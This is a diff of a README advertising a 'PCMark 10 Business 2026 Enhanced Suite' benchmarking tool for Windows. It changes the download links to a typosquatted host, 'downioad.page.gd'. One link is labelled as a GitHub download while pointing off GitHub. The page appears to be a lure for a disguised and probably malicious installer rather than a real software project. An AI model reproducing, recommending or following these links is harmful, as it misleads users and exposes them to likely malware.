@@ -2,7 +2,7 @@
 
 PCMark 10 Business 2026 Enhanced Suite is a professional-grade benchmarking tool designed for Windows 10 and 11. It provides extensive testing capabilities to evaluate system performance in business scenarios, helping IT professionals optimize their hardware and software configurations.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## Key Features
 
@@ -60,7 +60,7 @@ If you encounter installation issues, first verify that your system meets the re
 
 Get the latest version of PCMark 10 Business 2026 Enhanced Suite from our official download page:
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 *Last Updated: March 2026*  
 *© 2026 Benchmarking Tools Community. All rights reserved.*
